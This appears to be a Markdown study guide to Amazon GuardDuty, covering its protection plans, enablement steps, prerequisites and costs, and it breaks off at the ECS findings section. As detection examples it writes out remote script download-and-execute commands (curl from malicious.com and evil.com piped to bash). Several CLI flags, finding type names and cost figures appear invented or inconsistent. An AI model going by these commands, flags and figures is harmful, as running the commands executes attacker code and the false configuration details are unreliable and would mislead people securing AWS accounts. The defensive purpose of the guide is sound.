# **Amazon GuardDuty – Threat Detection for AWS**
## Overview
Amazon GuardDuty is a **managed threat detection service** that helps protect your AWS accounts, workloads, and data. 
- **_Technologies Behind GuardDuty_**
  - **Machine Learning (ML)** to identify anomalies.
  - **Threat Intelligence Feeds** from AWS and partners (e.g., malicious IPs/domains, malware hashes).
  - **Contextual Analysis** for understanding threats in real time.

<details>
  <summary>Click to view detailed overview</summary>

- **Amazon GuardDuty** is a managed threat detection service that continuously monitors for malicious activity and unauthorized behavior. It uses multiple foundational data sources:
  - AWS CloudTrail management events
  - Amazon VPC Flow Logs
  - Amazon Route 53 DNS query logs

- GuardDuty can also monitor additional optional data sources (called protection types) such as:
  - Amazon S3 data events
  - EKS audit logs
  - RDS login activity
  - Lambda network logs
  - Runtime Monitoring (for EC2, ECS, EKS)
  - EBS volumes (Malware scan)

- **Easy to Use**
  - **One-click activation** — No need for complex setup or agents.
  - **Out-of-the-box functionality** — Immediate insights without extra configurations.

- **How It Works**
  - GuardDuty continuously analyzes **tens of billions of events per minute** from AWS data sources to:
    - Detect **suspicious behavior** or unauthorized activities.
    - Identify and **prioritize threats** based on context and risk.
    - Provide **security context** for faster incident response.

- **Integrated and Scalable**
  - Works across **EC2**, **ECS**, **EKS**, **AWS Lambda**, **RDS**, **Aurora**, and **S3**.
  - Seamless integration with **AWS services** like AWS Security Hub, Amazon EventBridge, and AWS Lambda for **automated remediation**.
  - Scales effortlessly across all your AWS resources.

- Benefits
  - **Continuous monitoring** across AWS accounts and regions.
  - **No agent required** – Fully managed.
  - **Fast threat response** with automated alerts and integrations.
  - **Improves security posture** with proactive threat detection.

</details>

---

## **Features**
Amazon GuardDuty is a smart threat detection service designed to monitor and protect your AWS environment. It uses machine learning, threat intelligence, and behavior analysis to identify security threats in real time.

### What GuardDuty Can Detect

| 🧨 Threat Type                          | 🔍 Description                                                                      |
| --------------------------------------- | ----------------------------------------------------------------------------------- |
| **Compromised Credentials**             | Detects if AWS access keys are stolen and misused.                                  |
| **Data Exfiltration**                   | Flags data theft or destruction—potential signs of ransomware.                      |
| **Unusual DB Access**                   | Anomalous login patterns in Aurora & RDS databases.                                 |
| **Unauthorized Cryptomining**           | Identifies mining operations on EC2 & container instances.                          |
| **Malware Presence**                    | Detects known malware in EC2, containers, and S3 file uploads.                      |
| **Suspicious OS/Network/File Behavior** | Identifies OS-level intrusions on EKS, ECS (Fargate), EC2, and container workloads. |

<details>
 <summary>Click to view Features with Example</summary>

### 1. **Continuous Monitoring of Foundational Data Sources**
GuardDuty automatically monitors three main AWS data sources:

1. **AWS CloudTrail management events** – Tracks user activities like API calls.
2. **VPC Flow Logs** – Logs traffic going in and out of your EC2 instances.
3. **DNS Logs** – Tracks domain name lookups made by your resources.

<details>
 <summary>Click to view Example</summary>

### Example:

Suppose an EC2 instance starts making DNS queries to a known malware domain (e.g., `bad-malware-site.ru`). GuardDuty detects this through DNS logs and alerts you with a finding like:

> *"EC2 instance is communicating with a known command-and-control domain."*

📘 No manual setup is required—just enable GuardDuty and it starts monitoring.

</details>

---

### 2. **Extended Threat Detection (Multi-Stage Attacks)**
Detects **attack chains** that span multiple logs, AWS services, or over time. It correlates events that might seem harmless individually but are dangerous when combined.

<details>
 <summary>Click to view Example</summary>

### Example:

1. An attacker logs into your account using a compromised credential (CloudTrail log).
2. Then launches a new EC2 instance (CloudTrail).
3. That EC2 instance starts scanning internal IPs (VPC Flow Logs).

GuardDuty pieces these events together and creates a single **attack sequence finding**, like:

> *"Suspicious EC2 activity: Unauthorized access followed by lateral network scanning."*

📘 Extended Threat Detection is **enabled by default** and has **no extra cost**.

</details>

---

### 3. **Use-Case Focused Protection Plans**
GuardDuty offers optional "add-on" features for **specific AWS services** to enhance security.

### **S3 Protection**
Analyzes access patterns and newly uploaded files in your Amazon S3 buckets.

<details>
 <summary>Click to view Example</summary>

#### Example:

If someone downloads hundreds of files in a short time from an S3 bucket, GuardDuty might flag:

> *"Unusual data download from S3 bucket, possible exfiltration."*

📘 Enable S3 protection to monitor **data access and potential leaks**.

</details>

---

### **EKS Protection**
Monitors Kubernetes API (audit logs) in Amazon EKS for suspicious behavior.

<details>
 <summary>Click to view Example</summary>

#### Example:

A user tries to escalate privileges using `kubectl create clusterrolebinding`:

> *"Kubernetes privilege escalation attempt in EKS cluster."*

📘 Helps detect attacks like misconfigured roles or unauthorized deployments.

</details>

---

### **Runtime Monitoring**
Watches system-level activity (like file or process operations) in EC2, ECS (Fargate), and EKS.

<details>
 <summary>Click to view Example</summary>

#### Example:

GuardDuty sees a suspicious shell command like:

```bash
curl http://malicious.com/backdoor.sh | bash
```

> *"Suspicious command execution detected in EC2."*

📘 Useful for detecting malware, reverse shells, or script-based attacks.

</details>

---

### **Malware Protection for EC2 (EBS Scanning)**

Scans EBS volumes for known malware signatures.

<details>
 <summary>Click to view Example</summary>

#### Example:

After a breach, you run a malware scan on EC2 and GuardDuty detects:

> *"Malware signature matched in EBS volume attached to EC2 instance."*

📘 Available as **on-demand or scheduled** scans.

</details>

---

### 🧪 **Malware Protection for S3**

Scans newly uploaded S3 objects for malware.

<details>
 <summary>Click to view Example</summary>

#### Example:

Someone uploads an infected ZIP file to an S3 bucket:

> *"Malware detected in newly uploaded file to S3."*

📘 You can use this feature **independently** without enabling full GuardDuty.

</details>

---

### **RDS Protection**

Analyzes **login attempts** to Aurora and RDS databases for unusual behavior.

<details>
 <summary>Click to view Example</summary>

#### Example:

Multiple failed login attempts from an IP in another country:

> *"Brute-force login attempt on RDS instance."*

📘 Protects your database from unauthorized access.

</details>


#### **GuardDuty RDS Protection – Supported MySQL Versions**
- Supported for **Amazon Aurora MySQL**:
  - **Aurora MySQL version 2.10.2 or later**
  - **Aurora MySQL version 3.02.1 or later**

> So if you're using **Aurora MySQL** (not regular RDS for MySQL), and you're on one of the above versions, **GuardDuty RDS Protection** **will monitor login activity** and generate findings based on anomalies.

#### **Not Supported for RDS for MySQL (standard RDS)**

GuardDuty **does not currently support**:

* Regular **Amazon RDS for MySQL**
* Self-managed MySQL (on EC2, for example)

The documentation specifically lists **Aurora MySQL**, not RDS MySQL, in the supported engines.

#### What GuardDuty Monitors for Aurora MySQL

Once enabled:

* It **automatically collects RDS login activity** (successful, failed, and incomplete logins).
* It uses this to detect **suspicious login patterns**, such as:

  * Brute force attacks
  * Unusual source IPs or geolocations
  * Unexpected login times or credentials

### Learning Period

When you first enable RDS Protection or create a new DB instance:

* GuardDuty undergoes a **learning period (up to 2 weeks)** to baseline what “normal” looks like.
* During this time, **no findings will be generated**, even if login activity occurs.

### Summary

| Engine                                           | Supported by GuardDuty RDS Protection? | Notes                                              |
| ------------------------------------------------ | -------------------------------------- | -------------------------------------------------- |
| **Aurora MySQL 2.10.2+ / 3.02.1+**               | ✅ Yes                                  | Must be one of the listed versions                 |
| **RDS for MySQL**                                | ❌ No                                   | Not currently supported                            |
| **Aurora PostgreSQL (10.23+ to 16.1+)**          | ✅ Yes                                  | Fully supported                                    |
| **RDS for PostgreSQL**                           | ✅ Yes                                  | From versions 11.17+, 12.12+, 13.8+, 14.5+, 15, 16 |
| **Aurora PostgreSQL Limitless (16.4-limitless)** | ✅ Yes                                  | Explicitly supported                               |

If you're using Aurora MySQL on a supported version, GuardDuty RDS Protection will monitor and alert on login threats. 

---

### **Lambda Protection**

Monitors **network activity** of Lambda functions, especially when running in VPC.

<details>
 <summary>Click to view Example</summary>

#### Example:

A Lambda function connects to a known crypto mining domain:

> *"AWS Lambda making outbound calls to known mining pool IP."*

📘 Helps detect misuse of serverless compute for malicious purposes.

</details>

---

### 4. **Multi-Account Management**
Centralized monitoring of multiple AWS accounts using:

* **AWS Organizations** (recommended)
* **Legacy invitation-based method**

<details>
 <summary>Click to view Example</summary>

### Example:

You are a security admin for 10 AWS accounts. Set up GuardDuty in your org master account to monitor all others from one place.

📘 Centralized view = simplified management and cost tracking.

</details>

---

### 5. **Security Findings and Sample Tests**
GuardDuty generates **detailed findings** when it detects a threat. Each finding includes:

* Threat type and severity
* Affected resources
* Recommended action

<details>
 <summary>Click to view Example</summary>

### Example:

> *"Recon\:EC2/PortProbeUnprotectedPort – An external IP is probing your EC2 port 22 (SSH).”*

You can also:

* Use **sample findings** for testing.
* Use **tester scripts** to simulate scenarios.

📘 Helps teams learn how to respond to real-world alerts.

</details>

---

### 6. **Managing and Visualizing Findings**

* View results in the **GuardDuty console dashboard**
* Query findings using:

  * **AWS CLI**
  * **AWS SDK**
  * **AWS Security Hub**

<details>
 <summary>Click to view Example</summary>

### Example:

Security team pulls high-severity findings across accounts:

```bash
aws guardduty list-findings --severity-criteria "HIGH"
```

📘 Enables analysis, alerting, and custom dashboards (e.g., using CloudWatch or Grafana).

</details>

---

### 7. **Integration with AWS Security Services**

### Integrated Services:

| Service                | Benefit                                                |
| ---------------------- | ------------------------------------------------------ |
| **AWS Security Hub**   | Central view of findings across AWS security services  |
| **Amazon Detective**   | Root cause analysis with visual timeline and graphs    |
| **Amazon EventBridge** | Automated response via Lambda, SNS, or Systems Manager |

<details>
 <summary>Click to view Example</summary>

### Example:

* When GuardDuty finds malware on EC2:

  * Security Hub prioritizes it.
  * Detective shows related actions (login, IP address).
  * EventBridge triggers Lambda to isolate the instance.

📘 Example Rule:

```json
{
  "source": ["aws.guardduty"],
  "detail-type": ["GuardDuty Finding"]
}
```

</details>

---

### 8. **PCI DSS Compliance**

* GuardDuty is **Level 1 PCI DSS certified**.
* Safe to use in environments where **credit card data** is processed or stored.

📘 You can request the AWS PCI Compliance package from the AWS Artifact console.

---

### 9. **Testing and Validation**

* Generate **sample findings** in the console.
* Use **testing scripts** to simulate threats and test responses.

<details>
 <summary>Click to view Example</summary>

### Example:

Generate test finding:

```bash
aws guardduty create-sample-findings --detector-id <your-detector-id>
```

</details>

</details>

---

# EC2 Protection

<details>
  <summary>Click to see brief analysis for EC2 Protection</summary>

## 1. GuardDuty Checks for EC2
GuardDuty analyzes three primary data sources (plus optional features) to detect threats affecting EC2 instances:

| Data Source / Feature     | What It Captures                                                     | Example EC2‑Related Threat & Finding                                                                              |
| ------------------------- | -------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- | 
| **VPC Flow Logs**         | Network traffic in/out of ENIs attached to EC2                       | **Portscan**: External host probing TCP ports (e.g., SSH port 22) Recon\:EC2/Portscan                           | 
| **CloudTrail Management** | EC2 API calls (RunInstances, StopInstances, DescribeInstances, etc.) | **Unauthorized Launch**: New instance spun up with stolen keys UnauthorizedAccess\:EC2/MaliciousIPCaller.Custom |
| **DNS Query Logs**        | DNS lookups originating from EC2 (via Route 53 Resolver)             | **C2 Communication**: Instance resolving a known malware domain Backdoor\:EC2/C\&CActivity.B!DNS                |
| **Runtime Monitoring** ⭐️ | OS‑level telemetry: process creation, file writes, shell commands    | **Reverse Shell**: Detected command \`curl [http://evil.com/shell.sh](http://evil.com/shell.sh)  bash\` Behavior\:EC2/NetworkPortUnusual |
| **EBS Volume Scans** ⭐️   | Agentless malware signature scans on EBS snapshots                   | **Disk‑Based Trojan**: Malware signature found in attached volume snapshot Malware\:EC2/MalwareSignatureMatch   |

> ⭐️ *Optional features you must explicitly enable under GuardDuty “Additional Features”.*

<details>
  <summary>Example</summary>

1. **Runtime Monitoring**

   * **Processes & Commands**: Tracks execution of binaries, unusual shell commands, scripting activity.
   * **File Events**: Detects unexpected file creations, permissions changes, or script drops.
   * **Threat Example**:

     * Finding:

       ```json
       {
         "findingType": "Behavior:EC2/NetworkPortUnusual",
         "description": "Suspicious command execution detected: curl http://evil.com/shell.sh | bash"
       }
       ```

2. **EBS Volume Scans**

   * **Malware Signatures**: Scans snapshots of attached EBS volumes for known virus or trojan signatures.
   * **Snapshot Analysis**: GuardDuty creates a point‑in‑time snapshot, scans it agentlessly, then deletes it.
   * **Threat Example**:

     * Finding:

       ```json
       {
         "findingType": "Malware:EC2/MalwareSignatureMatch",
         "description": "EBS snapshot of volume vol-0123456789abcdef contains known Trojan: Win.Trojan.XYZ"
       }
       ```

</details>


## 2. Enabling GuardDuty for EC2
<details>
  <summary>Click to view console steps and CLI/SDK</summary>

### 2.1 Console Steps

1. **Sign in** to the AWS Management Console in the target Region.
2. Navigate to **Security, Identity, & Compliance → GuardDuty**.
3. Click **Enable GuardDuty** (or **Get started** if first time).
4. (Optional) Under **Additional features**, enable:

   * **Runtime Monitoring**
   * **Malware Protection for EC2**
5. **Save**. GuardDuty immediately begins ingesting VPC Flow Logs, CloudTrail management events, and DNS logs.

### 2.2 CLI / SDK

```bash
# Create or retrieve detector
aws guardduty create-detector --enable
# Enable Malware Protection
aws guardduty update-detector --detector-id <detectorId> \
  --finding-publishing-frequency FIFTEEN_MINUTES \
  --enable-malware-protection
```

</details>

## 3. Prerequisites

1. **IAM Permissions**

   * To enable GuardDuty: `guardduty:CreateDetector`, `guardduty:UpdateDetector`, `iam:CreateServiceLinkedRole`
   * To access findings: `guardduty:GetFindings`, `guardduty:ListFindings`

2. **Service‑Linked Roles**

   * `AWSServiceRoleForAmazonGuardDuty` (foundational logs)
   * `AWSServiceRoleForAmazonGuardDutyMalwareProtection` (EBS volume scanning)

3. **Regional Considerations**

   * GuardDuty is **regional**. Repeat enablement per Region.
   * Recommended: enable in **all Regions** (even unused) to capture global events (e.g., IAM).

4. **Logging Configuration**

   * **VPC Flow Logs** and **CloudTrail** must be active in the VPC/account (GuardDuty reads from AWS‑managed streams; you only need to turn those logs on if you want your own archive).
   * **Route 53 Resolver Query Logs** must be enabled if you need DNS-based telemetry (GuardDuty uses its own Resolver logging channel).

## 4. What You’ll Receive: EC2 Findings

When suspicious EC2 activity is detected, GuardDuty generates **JSON findings** with:

* **Finding Type** (e.g., `Backdoor:EC2/C&CActivity.B`)
* **Severity** (0.1–8.9 scale mapped to Low/Medium/High)
* **Resource Details**:

  * `resourceType: "Instance"`
  * `instanceId`, `ownerId`, `availabilityZone`
* **Service Action**: API call or network action
* **Evidence**: IP addresses, domains, user agents, process names
* **Remediation Guidance**: Links to the EC2 console and AWS docs

## 5. Benefits for EC2 Security

| Benefit                       | Description                                                                      |
| ----------------------------- | -------------------------------------------------------------------------------- |
| **Broad Threat Coverage**     | Detects port scans, brute‑force (SSH/RDP), C\&C, crypto‑mining, malware.         |
| **Agentless**                 | No software installs on your instances; uses existing AWS logs/streams.          |
| **Behavioral & Intelligence** | ML‑based anomaly detection plus Threat Intelligence (malicious IP/domain lists). |
| **Automated Response**        | Integrate with EventBridge → Lambda/SNS/Security Hub for real‑time remediation.  |
| **Centralized Monitoring**    | Multi‑account support via AWS Organizations; single dashboard for all regions.   |

## 6. Cost Model

1. **Threat Detection**

   * **\$4.00 per million events** analyzed from CloudTrail, VPC Flow Logs, DNS logs
   * Ingested events include management API calls, flow log records, DNS queries

2. **Optional S3-Malware & EC2-Malware Protection**

   * **EC2 Malware**: \$1.00 per GB of EBS volume scanned
   * **S3 Malware**: \$1.00 per 1,000 objects scanned

3. **Free Trial**

   * **30 days free per Region** for all enabled features
   * Full coverage for CloudTrail, VPC, DNS, and all protection plans during trial

4. **Example Estimate**

   * A medium account generating 5 million Flow Log records and 1 million CloudTrail events per month →

     ```
     (5M + 1M) / 1M × $4 = $24/month
     + Malware scans (e.g. 50 GB EBS) → 50 × $1 = $50/month
     = ~$74/month total
     ```

</details>
     
---

# **RDS Protection**

<details>
  <summary>Click to see brief analysis for RDS Protection</summary>

1. **GuardDuty Checks for RDS**
   GuardDuty ingests these data sources (plus default extended detection) to detect threats against your RDS/Aurora instances:

   | Data Source / Feature            | What It Captures                                                      | Example RDS‑Related Threat & Finding                                                                                             |
   | -------------------------------- | --------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
   | **CloudTrail Management Events** | RDS/Aurora DB login API calls (`Connect`, `Authenticate`, `Failover`) | **Brute‑Force Login**: Multiple failed `Connect` calls from same IP RDS.LoginAnomaly.Behavioral                                |
   | **Extended Threat Detection**    | Correlates multi‑step attack sequences spanning RDS and other sources | **Data Exfiltration Chain**: Compromised EC2 → RDS read → S3 upload Backdoor\:EC2/C\&CActivity.B + RDS.LoginAnomaly.Behavioral |
   | **RDS Protection Plan** ⭐️       | Profiles normal login patterns and flags anomalies (new IPs/clients)  | **Unusual Client**: Login from unknown JDBC driver at odd hours RDS.LoginAnomaly.Behavioral                                    |

   ⭐️ *Optional “RDS Protection” under GuardDuty “Additional Features.”*

2. **Enabling GuardDuty for RDS**

   * **Console**

     1. Open GuardDuty → **Settings**.
     2. Under **Additional features**, toggle **RDS Protection**.
     3. Click **Save**.

   * **CLI**

     ```bash
     aws guardduty update-detector \
       --detector-id <detectorId> \
       --enable-rds-logs
     ```

3. **Prerequisites**

   * **IAM Permissions**

     * To enable GuardDuty:
       `guardduty:CreateDetector`, `guardduty:UpdateDetector`, `iam:CreateServiceLinkedRole`
     * To view findings:
       `guardduty:GetFindings`, `guardduty:ListFindings`

   * **Service‑Linked Roles**

     * `AWSServiceRoleForAmazonGuardDuty` (foundational logs)

   * **Logging Configuration**

     * **CloudTrail**: must be enabled for management events in the account.
     * No additional RDS-specific logging required—GuardDuty reads the AWS‑managed management event stream.

   * **Regional Considerations**

     * GuardDuty is regional; repeat per Region.
     * Recommended to enable in all Regions to catch cross‑region IAM and RDS activity.

4. **What You’ll Receive: RDS Findings**

   When suspicious RDS activity is detected, GuardDuty generates JSON findings that include:

   * **Finding Type** (e.g., `RDS.LoginAnomaly.Behavioral`)
   * **Severity** (0.1–8.9 mapped to Low/Medium/High)
   * **Resource Details**:

     * `resourceType: "RDSInstance"`
     * `dbInstanceIdentifier`, `engine`, `region`
   * **Service Action**: API call details (`Connect`, `Failover`, etc.)
   * **Evidence**: source IP, client driver, login success/failure counts
   * **Remediation Guidance**: links to RDS console and AWS docs

5. **Benefits for RDS Security**

   | Benefit                     | Description                                                                         |
   | --------------------------- | ----------------------------------------------------------------------------------- |
   | **Login Anomaly Detection** | Flags brute‑force, credential stuffing, and unauthorized access attempts.           |
   | **Behavioral Profiling**    | Learns normal login patterns (times, IP ranges, clients) to reduce false positives. |
   | **Agentless**               | No database‑side agents—uses AWS log streams and ML models.                         |
   | **Multi‑Stage Visibility**  | Correlates RDS events with EC2, S3, and other services for attack chain detection.  |
   | **Automated Response**      | Integrates with EventBridge, Security Hub, or Lambda to block or alert.             |

6. **Cost Model**

   * **Threat Detection Events**

     * Counts each CloudTrail management event (including RDS calls) toward the **\$4.00 per 1 million events** rate.
     * No separate fee for RDS Protection—events are billed as part of standard threat detection.

   * **Free Trial**

     * 30-day full-feature trial per Region.

   * **Example Estimate**

     ```
     100K RDS login events/month → 0.1M × $4 = $0.40
     +
     900K other events → 0.9M × $4 = $3.60
     =
     ~$4.00/month total
     ```

---

**Next Steps**:

* Enable GuardDuty via CloudFormation/Terraform for automated deployments
* Hook findings into Security Hub and EventBridge for centralized alerting and remediation
* Review sample findings to fine‑tune suppression rules and trusted IP lists

Amazon GuardDuty monitors EC2 instances for a wide range of suspicious or malicious behaviors. You’ll receive findings about:
1. **Malware activity** (e.g., command-and-control, trojans, blackhole domains).
2. **Credential abuse or unauthorized access** (e.g., SSH/RDP brute-force, metadata tampering).
3. **Network-based threats** (e.g., port scans, DDoS, unusual traffic volumes).
4. **Crypto mining operations** (e.g., Bitcoin tool usage or related domain activity).
5. **Reconnaissance and evasion techniques** (e.g., DoH, DoT, DNS tunneling, Tor usage).
6. **Outbound communication with malicious or suspicious domains and IPs**.

</details>

---

# **S3 Protection**

<details>
  <summary>Click to see brief analysis for S3 Protection</summary>

1. **GuardDuty Checks for S3**
   GuardDuty ingests these data sources (plus optional features) to detect threats against your S3 buckets:

   | Data Source / Feature            | What It Captures                                                        | Example S3‑Related Threat & Finding                                                                                   |
   | -------------------------------- | ----------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
   | **CloudTrail Data Events**       | API calls on S3 objects (GetObject, PutObject, DeleteObject, etc.)      | **Unusual Data Download**: Hundreds of GetObject calls in 5 minutes from a single IP S3.Bucket‑Exfiltration.Unusual |
   | **S3 Server Access Logs**        | Detailed request logs (if you’ve enabled server logging on your bucket) | **Public Bucket Enumeration**: Repeated ListBucket requests from multiple geographies S3.Bucket‑Enumeration.Unusual |
   | **DNS Query Logs**               | DNS lookups originating from S3 endpoints                               | **Phishing Redirect**: Resolving a known phishing domain in object URL S3.Bucket‑PublicAccess.ProhibitedDNSRequest  |
   | **Malware Protection for S3** ⭐️ | Scans newly uploaded objects for known malware signatures               | **Malicious Upload**: Detected Trojan in a newly uploaded ZIP Malware\:S3/Object.MalwareSignatureMatch              |

   ⭐️ *Optional feature; must explicitly enable “S3 Malware Protection” under GuardDuty “Additional Features.”*

2. **Enabling GuardDuty for S3**
<details>
  <summary>Click to view console steps and CLI/SDK</summary>

   * **Console**

     1. Open the GuardDuty console → **Settings**.
     2. Under **Additional features**, toggle **S3 Protection** and/or **S3 Malware Protection**.
     3. Click **Save**.

   * **CLI**

     ```bash
     # Enable S3 Protection (data events)
     aws guardduty update-detector \
       --detector-id <detectorId> \
       --enable-s3-logs
     # Enable S3 Malware Protection
     aws guardduty update-detector \
       --detector-id <detectorId> \
       --enable-malware-protection-for-s3
     ```

</details>

3. **Prerequisites**

   * **IAM Permissions**

     * To enable GuardDuty:
       `guardduty:CreateDetector`, `guardduty:UpdateDetector`, `iam:CreateServiceLinkedRole`
     * To configure S3 export (if used):
       `s3:PutBucketPolicy`, `kms:GenerateDataKey` (for KMS‑encrypted exports)

   * **Service‑Linked Roles**

     * `AWSServiceRoleForAmazonGuardDuty` (foundational)
     * `AWSServiceRoleForAmazonGuardDutyMalwareProtection` (for S3 malware scans)

   * **Logging Configuration**

     * **CloudTrail**: must have **Data Events** enabled for the target buckets.
     * **S3 Server Access Logs** (optional): enable on the bucket if you want detailed request logs.
     * **Route 53 Resolver Query Logs** (optional): if you need DNS‑based alerts on S3 endpoints.

   * **Regional Considerations**

     * GuardDuty is regional—repeat enablement per Region.
     * Recommended: enable in all Regions to catch cross‑region activity.

4. **What You’ll Receive: S3 Findings**

   When suspicious S3 activity is detected, GuardDuty generates JSON findings that include:

   * **Finding Type** (e.g., `S3.Bucket-Exfiltration.Unusual`)
   * **Severity** (0.1–8.9 mapped to Low/Medium/High)
   * **Resource Details**:

     * `resourceType: "S3Bucket"`
     * `bucketName`, `objectKey` (if applicable)
   * **Service Action**: API call details or malware signature match
   * **Evidence**: source IP, IAM principal, request parameters, malware hash
   * **Remediation Guidance**: direct links to the S3 console and AWS docs

5. **Benefits for S3 Security**

   | Benefit                      | Description                                                                    |
   | ---------------------------- | ------------------------------------------------------------------------------ |
   | **Detect Data Exfiltration** | Flags unusual download patterns or mass deletions.                             |
   | **Malware Upload Detection** | Scans newly uploaded objects for viruses/trojans without agents.               |
   | **Minimal Configuration**    | No agents—uses existing CloudTrail and optional server logs.                   |
   | **Contextual Alerts**        | Includes request details (IP, user, object) for faster triage.                 |
   | **Automated Workflows**      | Integrates with EventBridge → Lambda/SNS/Security Hub to quarantine or notify. |

6. **Cost Model**

   * **Threat Detection (Data Events)**

     * \$4.00 per 1 million S3 Data Events analyzed (GetObject, PutObject, etc.)
   * **Malware Protection for S3**

     * \$1.00 per 1,000 objects scanned
   * **Free Trial**

     * 30-day free trial per Region for all enabled features
   * **Example Estimate**

     ```
     200K GetObject events/month → 0.2M × $4 = $0.80
     +
     5,000 objects scanned → 5 × $1 = $5.00
     =
     ~$5.80/month total
     ```

</details>

---

# **Lambda Protection**

<details>
  <summary>Click to see brief analysis for Lambda Protection</summary>

1. **GuardDuty Checks for Lambda**
   GuardDuty ingests these data sources (plus optional features) to detect network‑based threats against your Lambda functions:

   | Data Source / Feature             | What It Captures                                                       | Example Lambda‑Related Threat & Finding                                                                                                   |
   | --------------------------------- | ---------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
   | **VPC Flow Logs**                 | In‑VPC network traffic to/from ENIs used by Lambda functions           | **Malicious C2**: Lambda in VPC connecting to known malware host Lambda.FunctionCommunication.MaliciousDomain                           |
   | **DNS Query Logs**                | DNS lookups initiated by Lambda (via Route 53 Resolver logs)           | **Suspicious DNS**: Lambda resolving DGA domains Trojan\:Lambda/DGADomainRequest.B                                                      |
   | **CloudTrail Management Events**  | Lambda API calls (`Invoke`, `CreateFunction`, `UpdateFunctionCode`)    | **Unauthorized Deploy**: New function version deployed by unusual principal UnauthorizedAccess\:Lambda/ConfigChange                     |
   | **Extended Threat Detection**     | Correlates Lambda activity with other services for multi‑stage attacks | **Phishing Chain**: Compromised EC2 → Lambda invoked → S3 exfiltrate Recon\:EC2/Portscan + Lambda.FunctionCommunication.MaliciousDomain |

   ⭐️ *Lambda uses managed runtimes; no OS‑level telemetry or EBS scans apply.*

2. **Enabling GuardDuty for Lambda**

   * **Console**

     1. Open GuardDuty → **Settings**.
     2. Under **Additional features**, toggle **Lambda Protection**.
     3. Click **Save**.

   * **CLI**

     ```bash
     aws guardduty update-detector \
       --detector-id <detectorId> \
       --enable-lambda-protection
     ```

3. **Prerequisites**

   * **IAM Permissions**

     * To enable GuardDuty:
       `guardduty:CreateDetector`, `guardduty:UpdateDetector`, `iam:CreateServiceLinkedRole`
     * To view findings:
       `guardduty:GetFindings`, `guardduty:ListFindings`

   * **Service‑Linked Role**

     * `AWSServiceRoleForAmazonGuardDuty` (foundational logs)

   * **Logging Configuration**

     * **VPC Flow Logs**: must be enabled on the subnets used by your Lambda functions (if they run in a VPC).
     * **Route 53 Resolver Query Logs**: enable if you need DNS‑based alerts for Lambda traffic.
     * **CloudTrail**: management events enabled by default.

   * **Regional Considerations**

     * GuardDuty is regional; repeat per Region.
     * Recommended to enable in all Regions to catch cross‑region Lambda invocations and global threats.

4. **What You’ll Receive: Lambda Findings**

   When suspicious Lambda activity is detected, GuardDuty generates JSON findings that include:

   * **Finding Type** (e.g., `Lambda.FunctionCommunication.MaliciousDomain`)
   * **Severity** (0.1–8.9 mapped to Low/Medium/High)
   * **Resource Details**:

     * `resourceType: "LambdaFunction"`
     * `functionName`, `functionArn`, `region`
   * **Service Action**: network action or API call details
   * **Evidence**: remote IP/domain, DNS queries, caller identity
   * **Remediation Guidance**: links to the Lambda console and AWS docs

5. **Benefits for Lambda Security**

   | Benefit                      | Description                                                                  |
   | ---------------------------- | ---------------------------------------------------------------------------- |
   | **Network Threat Detection** | Flags outbound C2, crypto‑mining, data exfiltration from within Lambda VPCs. |
   | **DNS‑Based Alerts**         | Catches DNS tunneling, DGA domains, and phishing redirects from your code.   |
   | **Configuration Monitoring** | Alerts on unauthorized function updates or misconfigurations.                |
   | **Agentless**                | Uses existing VPC and CloudTrail logs—no code changes or agents required.    |
   | **Automated Response**       | Integrates with EventBridge → Lambda/SNS/Security Hub to isolate or notify.  |

6. **Cost Model**

   * **Threat Detection Events**

     * All Lambda‑related flow, DNS, and CloudTrail events count toward **\$4.00 per 1 million events**.
   * **Free Trial**

     * 30‑day full‑feature trial per Region.
   * **Example Estimate**

     ```
     500K VPC Flow Log records + 200K DNS queries + 100K CloudTrail events/month
     = 0.8M × $4 = $3.20/month
     ```

</details>

---

# **ECS Protection**

<details>
  <summary>Click to see brief analysis for ECS Protection</summary>

1. **GuardDuty Checks for ECS**
   GuardDuty analyzes these data sources (plus optional features) to detect threats against your Amazon ECS workloads:

   | Data Source / Feature            | What It Captures                                                             | Example ECS‑Related Threat & Finding                                                                                        |
   | -------------------------------- | ---------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
   | **CloudTrail Management Events** | ECS API calls (`RunTask`, `CreateService`, `RegisterTaskDefinition`, etc.)   | **Unauthorized Task Launch**: New task started by an unfamiliar IAM principal UnauthorizedAccess\:ECS/RunTaskUnauthorized |
   | **VPC Flow Logs**                | Network traffic in/out of ENIs attached to ECS tasks (Fargate or EC2‑backed) | **Portscan**: Task probing another container’s port 8080 Recon\:ECS/PortscanContainerInstance                             |
   | **DNS Query Logs**               | DNS lookups from within your ECS tasks (via Route 53 Resolver logs)          | **C2 Communication**: Container resolving a known malware C2 domain Backdoor\:ECS/C\&CActivity.B!DNS                      |
   | **Runtime Monitoring** ⭐️        | OS‑ and container‑level telemetry: process execs, file writes, library loads | **Crypto‑Mining Container**: Detected `xmrig` process inside a Fargate task CryptoCurrency\:ECS/LinuxCryptominingTool     |
   | **Extended Threat Detection**    | Correlates sequences across ECS, EC2, S3, etc., for multi‑stage attacks      | **Lateral Movement**: Compromised EC2 → ECS task launched → RDS login anomaly Behavior\:ECS/ContainerUnusualBehavior      |

   ⭐️ *“Runtime Monitoring” and “Extended Threat Detection” must be enabled under GuardDuty “Additional features.”*

2. **Enabling GuardDuty for ECS**

   * **Console**

     1. Open GuardDuty → **Settings**.
     2. Under **Additional features**, toggle **Runtime Monitoring** and ensure **Extended Threat Detection** is enabled.
     3. Click **Save**.

   * **CLI**

     ```bash
     # Enable Runtime Monitoring (covers ECS)
     aws guardduty update-detector \
       --detector-id <detectorId> \
       --enable-runtime-monitoring
     ```

3. **Prerequisites**

   * **IAM Permissions**

     * To enable GuardDuty:
       `guardduty:CreateDetector`, `guardduty:UpdateDetector`, `iam:CreateServiceLinkedRole`
     * To access findings:
       `guardduty:GetFindings`, `guardduty:ListFindings`

   * **Service‑Linked Roles**

     * `AWSServiceRoleForAmazonGuardDuty` (foundational logs)

   * **Logging Configuration**

     * **VPC Flow Logs**: enabled for the subnets hosting ECS tasks.
     * **Route 53 Resolver Query Logs**: optional for DNS visibility.
     * **CloudTrail**: management events must be enabled (default).

   * **Regional Considerations**

     * GuardDuty is regional; repeat per Region.
     * Recommended to enable in all Regions to capture any cross‑region task operations.

4. **What You’ll Receive: ECS Findings**

